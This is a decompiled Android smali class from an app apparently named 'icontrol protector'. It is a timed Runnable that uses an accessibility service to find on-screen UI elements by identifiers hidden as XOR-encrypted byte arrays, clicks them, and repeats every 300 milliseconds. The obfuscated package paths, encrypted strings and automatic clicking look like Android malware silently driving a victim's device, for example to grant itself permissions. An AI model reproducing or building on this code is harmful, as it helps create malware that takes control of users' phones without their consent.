.class Lcom/icontrol/protector/m$e$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/m$e;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Lcom/icontrol/protector/m$e;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/m$e;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/m$e$a;->e:Lcom/icontrol/protector/m$e;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    sget-object v0, Lcom/icontrol/protector/m;->a:Lcom/icontrol/protector/AccessServices;

    const/16 v1, 0x27

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x96

    if-eqz v0, :cond_0

    :goto_0
    invoke-static {v0}, Lcom/icontrol/protector/m;->l0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v1}, Lcom/icontrol/protector/m;->a0(I)V

    goto :goto_1

    :cond_0
    sget-object v0, Lcom/icontrol/protector/m;->a:Lcom/icontrol/protector/AccessServices;

    const/16 v3, 0x24

    new-array v3, v3, [B

    fill-array-data v3, :array_2

    new-array v4, v2, [B

    fill-array-data v4, :array_3

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_1

    const/4 v3, 0x0

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v3

    add-int/lit8 v3, v3, -0x1

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_1

    goto :goto_0

    :cond_1
    :goto_1
    sget-object v0, Lcom/icontrol/protector/m;->a:Lcom/icontrol/protector/AccessServices;

    const/16 v1, 0x23

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    new-array v2, v2, [B

    fill-array-data v2, :array_5

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_2

    invoke-static {v0}, Lcom/icontrol/protector/m;->l0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :cond_2
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/icontrol/protector/m$e$a$a;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/m$e$a$a;-><init>(Lcom/icontrol/protector/m$e$a;)V

    const-wide/16 v2, 0x12c

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    :array_0
    .array-data 1
        0x72t
        0x7dt
        0x78t
        0x23t
        -0x54t
        0x5dt
        -0x56t
        0x26t
        0x3ft
        0x61t
        0x70t
        0x6et
        -0x4ct
        0x46t
        -0x4at
        0x3bt
        0x68t
        0x71t
        0x70t
        0x63t
        -0x4bt
        0x51t
        -0x53t
        0x75t
        0x78t
        0x76t
        0x3at
        0x6et
        -0x4bt
        0x55t
        -0x80t
        0x3ft
        0x7et
        0x61t
        0x7ct
        0x79t
        -0x58t
        0x42t
        -0x46t
    .end array-data

    :array_1
    .array-data 1
        0x11t
        0x12t
        0x15t
        0xdt
        -0x3ft
        0x34t
        -0x21t
        0x4ft
    .end array-data

    :array_2
    .array-data 1
        0x23t
        -0x76t
        -0x79t
        0x60t
        0x3dt
        -0x7et
        -0x72t
        -0x55t
        0x6et
        -0x6at
        -0x71t
        0x2dt
        0x25t
        -0x67t
        -0x6et
        -0x4at
        0x39t
        -0x7at
        -0x71t
        0x20t
        0x24t
        -0x72t
        -0x77t
        -0x8t
        0x29t
        -0x7ft
        -0x3bt
        0x2ct
        0x24t
        -0x7bt
        -0x5ct
        -0x5bt
        0x32t
        -0x76t
        -0x61t
        0x3et
    .end array-data

    :array_3
    .array-data 1
        0x40t
        -0x1bt
        -0x16t
        0x4et
        0x50t
        -0x15t
        -0x5t
        -0x3et
    .end array-data

    :array_4
    .array-data 1
        -0xft
        -0x31t
        0x11t
        -0x4at
        0x38t
        -0x1ft
        -0x5ct
        0x28t
        -0x44t
        -0x2dt
        0x19t
        -0x5t
        0x20t
        -0x6t
        -0x48t
        0x35t
        -0x15t
        -0x3dt
        0x19t
        -0xat
        0x21t
        -0x13t
        -0x5dt
        0x7bt
        -0x5t
        -0x3ct
        0x53t
        -0x15t
        0x30t
        -0x4t
        -0x5bt
        0x28t
        -0x4t
        -0x39t
        0xft
    .end array-data

    :array_5
    .array-data 1
        -0x6et
        -0x60t
        0x7ct
        -0x68t
        0x55t
        -0x78t
        -0x2ft
        0x41t
    .end array-data
.end method
